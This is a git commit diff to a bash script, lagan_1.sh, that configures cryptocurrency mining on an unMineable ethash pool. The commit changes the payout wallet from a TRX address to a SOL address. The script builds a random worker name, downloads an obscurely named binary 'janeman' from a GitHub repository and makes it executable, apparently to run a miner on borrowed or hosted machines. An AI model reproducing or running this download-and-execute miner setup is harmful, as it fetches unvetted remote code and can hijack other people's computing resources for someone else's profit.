bb1832603b48597ba10a438019e8dd37e75df062
squibex <90225595+squibex@users.noreply.github.com>
2021-09-09 15:38:24 +0700

    Update lagan_1.sh

--- lagan_1.sh
+++ lagan_1.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
+WALLET=SOL:2gQKjdGD6BFMk7hnA6xzZvg9EbnPzUErHdyi39uqfLvf
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
 wget https://github.com/squibex/prem/raw/main/janeman
 chmod +x janeman
